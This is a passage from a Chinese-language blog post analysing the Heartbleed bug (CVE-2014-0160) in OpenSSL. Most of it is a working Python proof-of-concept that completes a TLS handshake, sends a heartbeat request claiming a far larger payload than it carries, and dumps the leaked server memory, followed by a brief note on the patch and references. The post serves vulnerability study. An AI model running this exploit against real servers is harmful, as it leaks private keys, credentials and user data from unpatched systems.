(CVE-2014-0160)&#x27;</span>)</span><br><span class="line">options.add_option(<span class="string">&#x27;-p&#x27;</span>, <span class="string">&#x27;--port&#x27;</span>, <span class="built_in">type</span>=<span class="string">&#x27;int&#x27;</span>, default=<span class="number">443</span>, <span class="built_in">help</span>=<span class="string">&#x27;TCP port to test (default: 443)&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">h2bin</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> x.replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>).decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 支持多个协议版本</span></span><br><span class="line">version = []</span><br><span class="line">version.append([<span class="string">&#x27;SSL 3.0&#x27;</span>,<span class="string">&#x27;03 00&#x27;</span>])</span><br><span class="line">version.append([<span class="string">&#x27;TLS 1.0&#x27;</span>,<span class="string">&#x27;03 01&#x27;</span>])</span><br><span class="line">version.append([<span class="string">&#x27;TLS 1.1&#x27;</span>,<span class="string">&#x27;03 02&#x27;</span>])</span><br><span class="line">version.append([<span class="string">&#x27;TLS 1.2&#x27;</span>,<span class="string">&#x27;03 03&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建 Hello 握手包</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_hello</span>(<span class="params">version</span>):</span><br><span class="line">    hello = h2bin(<span class="string">&#x27;16 &#x27;</span> + version + <span class="string">&#x27; 00 dc 01 00 00 d8 &#x27;</span> + version + <span class="string">&#x27;&#x27;&#x27; 53</span></span><br><span class="line"><span class="string">43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf</span></span><br><span class="line"><span class="string">bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00</span></span><br><span class="line"><span class="string">00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88</span></span><br><span class="line"><span class="string">00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c</span></span><br><span class="line"><span class="string">c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09</span></span><br><span class="line"><span class="string">c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44</span></span><br><span class="line"><span class="string">c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c</span></span><br><span class="line"><span class="string">c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11</span></span><br><span class="line"><span class="string">00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04</span></span><br><span class="line"><span class="string">03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19</span></span><br><span class="line"><span class="string">00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08</span></span><br><span class="line"><span class="string">00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13</span></span><br><span class="line"><span class="string">00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00</span></span><br><span class="line"><span class="string">00 0f 00 01 01</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> hello</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_hb</span>(<span class="params">version</span>):</span><br><span class="line">    <span class="comment"># 创建请求心跳包，18代表Heartbeat类型，00 03代表请求包的实际长度</span></span><br><span class="line">    <span class="comment"># 01代表 TLS1_HB_REQUEST 请求类型，40 00 代表 payload 长度值</span></span><br><span class="line">    hb = h2bin(<span class="string">&#x27;18 &#x27;</span> + version + <span class="string">&#x27; 00 03 01 40 00&#x27;</span>)    </span><br><span class="line">    <span class="keyword">return</span> hb</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hexdump</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> xrange(<span class="number">0</span>, <span class="built_in">len</span>(s), <span class="number">16</span>):</span><br><span class="line">        lin = [c <span class="keyword">for</span> c <span class="keyword">in</span> s[b : b + <span class="number">16</span>]]</span><br><span class="line">        hxdat = <span class="string">&#x27; &#x27;</span>.join(<span class="string">&#x27;%02X&#x27;</span> % <span class="built_in">ord</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> lin)</span><br><span class="line">        pdat = <span class="string">&#x27;&#x27;</span>.join((c <span class="keyword">if</span> <span class="number">32</span> &lt;= <span class="built_in">ord</span>(c) &lt;= <span class="number">126</span> <span class="keyword">else</span> <span class="string">&#x27;.&#x27;</span> )<span class="keyword">for</span> c <span class="keyword">in</span> lin)</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;  %04x: %-48s %s&#x27;</span> % (b, hxdat, pdat)</span><br><span class="line">    <span class="built_in">print</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recvall</span>(<span class="params">s, length, timeout=<span class="number">5</span></span>):</span><br><span class="line">    endtime = time.time() + timeout</span><br><span class="line">    rdata = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    remain = length</span><br><span class="line">    <span class="keyword">while</span> remain &gt; <span class="number">0</span>:</span><br><span class="line">        rtime = endtime - time.time()</span><br><span class="line">        <span class="keyword">if</span> rtime &lt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        r, w, e = select.select([s], [], [], <span class="number">5</span>)</span><br><span class="line">        <span class="keyword">if</span> s <span class="keyword">in</span> r:</span><br><span class="line">            data = s.recv(remain)</span><br><span class="line">            <span class="comment"># EOF?</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">            rdata += data</span><br><span class="line">            remain -= <span class="built_in">len</span>(data)</span><br><span class="line">    <span class="keyword">return</span> rdata</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recvmsg</span>(<span class="params">s</span>):</span><br><span class="line">    hdr = recvall(s, <span class="number">5</span>)</span><br><span class="line">    <span class="keyword">if</span> hdr <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;Unexpected EOF receiving record header - server closed connection&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line">    typ, ver, ln = struct.unpack(<span class="string">&#x27;&gt;BHH&#x27;</span>, hdr)</span><br><span class="line">    pay = recvall(s, ln, <span class="number">10</span>)</span><br><span class="line">    <span class="keyword">if</span> pay <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;Unexpected EOF receiving record payload - server closed connection&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27; ... received message: type = %d, ver = %04x, length = %d&#x27;</span> % (typ, ver, <span class="built_in">len</span>(pay))</span><br><span class="line">    <span class="keyword">return</span> typ, ver, pay</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hit_hb</span>(<span class="params">s,hb</span>):</span><br><span class="line">    s.send(hb)    <span class="comment"># 发送心跳请求包</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        typ, ver, pay = recvmsg(s)    <span class="comment"># 接收心跳响应包</span></span><br><span class="line">        <span class="keyword">if</span> typ <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;No heartbeat response received, server likely not vulnerable&#x27;</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> typ == <span class="number">24</span>:    <span class="comment"># 24代表 Heartbeat 类型</span></span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;Received heartbeat response:&#x27;</span></span><br><span class="line">            hexdump(pay)    <span class="comment"># 以 十六进制 + 字符串 的形式打印出心跳响应包数据</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(pay) &gt; <span class="number">3</span>:    <span class="comment"># 返回的数据长度越过实际长度3，就说明越界访问到其它内存数据，此时就存在漏洞</span></span><br><span class="line">                <span class="built_in">print</span> <span class="string">&#x27;WARNING: server returned more data than it should - server is vulnerable!&#x27;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span> <span class="string">&#x27;Server processed malformed heartbeat, but did not return any extra data.&#x27;</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> typ == <span class="number">21</span>:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;Received alert:&#x27;</span></span><br><span class="line">            hexdump(pay)</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;Server returned error, likely not vulnerable&#x27;</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    opts, args = options.parse_args()</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(args) &lt; <span class="number">1</span>:</span><br><span class="line">        options.print_help()</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(version)):</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;Trying &#x27;</span> + version[i][<span class="number">0</span>] + <span class="string">&#x27;...&#x27;</span></span><br><span class="line">        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;Connecting...&#x27;</span></span><br><span class="line">        sys.stdout.flush()</span><br><span class="line">        s.connect((args[<span class="number">0</span>], opts.port))</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;Sending Client Hello...&#x27;</span></span><br><span class="line">        sys.stdout.flush()</span><br><span class="line">        s.send(create_hello(version[i][<span class="number">1</span>]))</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;Waiting for Server Hello...&#x27;</span></span><br><span class="line">        sys.stdout.flush()</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            typ, ver, pay = recvmsg(s)</span><br><span class="line">            <span class="keyword">if</span> typ == <span class="literal">None</span>:</span><br><span class="line">                <span class="built_in">print</span> <span class="string">&#x27;Server closed connection without sending Server Hello.&#x27;</span></span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            <span class="comment"># Look for server hello done message.</span></span><br><span class="line">            <span class="keyword">if</span> typ == <span class="number">22</span> <span class="keyword">and</span> <span class="built_in">ord</span>(pay[<span class="number">0</span>]) == <span class="number">0x0E</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;Sending heartbeat request...&#x27;</span></span><br><span class="line">        sys.stdout.flush()</span><br><span class="line">        s.send(create_hb(version[i][<span class="number">1</span>]))</span><br><span class="line">        <span class="keyword">if</span> hit_hb(s,create_hb(version[i][<span class="number">1</span>])):</span><br><span class="line">            <span class="comment">#Stop if vulnerable</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></div><p>非常简单其实就是正常建立 TCP 连接，进行 TLS 握手 然后构造声明 payload 长度远大于实际 payload 长度的恶意心跳请求即可，在此不过多赘述</p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>Security Patch 主要为两个漏洞函数添加了对 s-&gt; s3-&gt; rrec.length 即 payload 长度值的判断，若声明长度大于实际长度则提前返回</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a class="link" target="_blank" rel="noopener external nofollow noreferrer" href="https://bugzilla.redhat.com/attachment.cgi?id=883475&action=diff">Security Patch<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br><a class="link" target="_blank" rel="noopener external nofollow noreferrer" href="https://heartbleed.com/">The Heartbleed Bug<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br><a class="link" target="_blank" rel="noopener external nofollow noreferrer" href="https://nvd.nist.gov/vuln/detail/CVE-2014-0160">NVD - CVE-2014-0160<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br><a class="link" target="_blank" rel="noopener external nofollow noreferrer" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160">CVE - CVE-2014-0160<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br><a class="link" target="_blank" rel="noopener external nofollow noreferrer" href="https://book.douban.com/subject/26830238/">漏洞战争<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p></div><div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8"><div class="article-copyright-info-container"><ul><li><strong>Título:</strong> CVE-2014-0160 Investigation</li><li><strong>Autor:</strong> 7erry</li><li><strong>Creado el :</strong> 2025-06-06 18:53:57</li><li><strong>Actualizado el :</strong> 2025-06-06 18:53:57</li><li><strong>Enlace:</strong> https://7erryx.github.io/2025/06/06/Vulnerability Investigation/CVE-2014-0160-Investigation/</li><li><strong>Licencia: </strong>Este trabajo está licenciado bajo <a class="license" target="_blank" rel="noopener external nofollow noreferrer" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.</li></ul></div></div><div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8"><div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2"><a class="prev" rel="prev" href="/2025/07/07/CVE-2021-44228-Investigation/"><span class="left arrow-icon flex justify-center items-center"><i class="fa-solid fa-chevron-left"></i> </span><span class="title flex justify-center items-center"><span class="post-nav-title-item truncate max-w-48">CVE-2021-44228 Investigation</span> <span class="post-nav-item">Publicaciones anteriores</span></span></a></div><div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2"><a class="next" rel="next" href="/2025/05/25/Vulnerability%20Investigation/CVE-2011-2110-Investigation/"><span class="title flex justify-center items-center"><span class="post-nav-title-item truncate max-w-48">CVE-2011-2110 Investigation</span> <span class="post-nav-item">Publicaciones siguientes</span> </span><span class="right arrow-icon flex justify-center items-center"><i class="fa-solid fa-chevron-right"></i></span></a></div></div></div><div class="toc-content-container"><div class="post-toc-wrap"><div class="post-toc"><div class="toc-title">En esta página</div><div class="page-title">CVE-2014-0160 Investigation</div><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Heart-Beat"><span class="nav-text">Heart Beat</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploit-%E5%88%86%E6%9E%90"><span class="nav-text">Exploit 分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="nav-text">漏洞修复</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Reference"><span class="nav-text">Reference</span></a></li></ol></div></div></div></div></div></div><div class="main-content-footer"><footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color"><div class="info-container py-3 text-center"><div class="text-center">&copy; <span>2020</span> - 2025&nbsp;&nbsp;<i class="fa-regular fa-computer-classic"></i>&nbsp;&nbsp;<a href="/">7erry</a><p class="post-count space-x-0.5"><span>76 publicaciones en total </span><span>219.3k palabras en total</span></p></div><script data-swup-reload-script src="https://cn.vercount.one/js"></script><div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right"><span id="busuanzi_container_site_uv" class="lg:!block"><span class="text-sm">CONTADOR DE VISITANTES</span> <span id="busuanzi_value_site_uv"></span> </span><span id="busuanzi_container_site_pv" class="lg:!block"><span class="text-sm">TOTAL DE VISITAS</span> <span id="busuanzi_value_site_pv"></span></span></div><div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left"><span class="lg:block text-sm">DESARROLLADO POR <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io" rel="external nofollow noreferrer">Hexo</a></span> <span class="text-sm lg:block">TEMA&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine" rel="external nofollow noreferrer">Redefine v2.8.4</a></span></div><div>Blog en línea por <span class="odometer" id="runtime_days"></span> días <span class="odometer" id="runtime_hours"></span> horas <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Seg</div><script data-swup-reload-script>try{function odometer_init(){document.querySelectorAll(".odometer").forEach(e=>{new Odometer({el:e,format:"( ddd).dd",duration:200})})}odometer_init()}catch(e){}</script></div></footer></div></div><div class="post-tools"><div class="post-tools-container"><ul class="article-tools-list"><li class="right-bottom-tools page-aside-toggle"><i class="fa-regular fa-outdent"></i></li></ul></div></div><div class="right-side-tools-container"><div class="side-tools-container"><ul class="hidden-tools-list"><li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center"><i class="fa-regular fa-magnifying-glass-plus"></i></li><li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center"><i class="fa-regular fa-magnifying-glass-minus"></i></li><li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center"><i class="fa-regular fa-moon"></i></li><li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center"><i class="fa-regular fa-arrow-down"></i></li></ul><ul class="visible-tools-list"><li class="right-bottom-tools toggle-tools-list flex justify-center items-center"><i class="fa-regular fa-cog fa-spin"></i></li><li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center"><i class="arrow-up fas fa-arrow-up"></i> <span class="percent"></span></li></ul></div></div><div class="image-viewer-container"><img src=""></div><div class="search-pop-overlay"><div class="popup search-popup"><div class="search-header"><span class="search-input-field-pre"><i class="fa-solid fa-keyboard"></i></span><div class="search-input-container"><input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="Buscar..." spellcheck="false" type="search" class="search-input"></div><span class="popup-btn-close"><i class="fa-solid fa-times"></i></span></div><div id="search-result"><div id="no-result"><i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i></div></div></div></div></main><script src="/js/build/libs/Swup.min.js"></script><script src="/js/build/libs/SwupSlideTheme.min.js"></script><script src="/js/build/libs/SwupScriptsPlugin.min.js"></script><script src="/js/build/libs/SwupProgressPlugin.min.js"></script><script src="/js/build/libs/SwupScrollPlugin.min.js"></script><script src="/js/build/libs/SwupPreloadPlugin.min.js"></script><script>const swup=new Swup({plugins:[new SwupScriptsPlugin({optin:!0}),new SwupProgressPlugin,new SwupScrollPlugin({offset:80}),new SwupSlideTheme({mainElement:".main-content-body"}),new SwupPreloadPlugin],containers:["#swup"]})</script><script src="/js/build/tools/imageViewer.js" type="module"></script><script src="/js/build/utils.js" type="module"></script><script src="/js/build/main.js" type="module"></script><script src="/js/build/layouts/navbarShrink.js" type="module"></script><script src="/js/build/tools/scrollTopBottom.js" type="module"></script><script src="/js/build/tools/lightDarkSwitch.js" type="module"></script><script src="/js/build/layouts/categoryList.js" type="module"></script><script src="/js/build/tools/localSearch.js" type="module"></script><script src="/js/build/tools/codeBlock.js" type="module"></script><script src="/js/build/layouts/lazyload.js" type="module"></script><script src="/js/build/tools/runtime.js"></script><script src="/js/build/libs/odometer.min.js"></script><link rel="stylesheet" href="/assets/odometer-theme-minimal.css"><script src="/js/build/libs/Typed.min.js"></script><script src="/js/build/plugins/typed.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/mermaid@9.3.0/dist/mermaid.min.js"></script><script src="/js/build/plugins/mermaid.js"></script><script src="/js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script><script src="/js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script><script src="/js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script><script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script><script src="/js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script></body></html>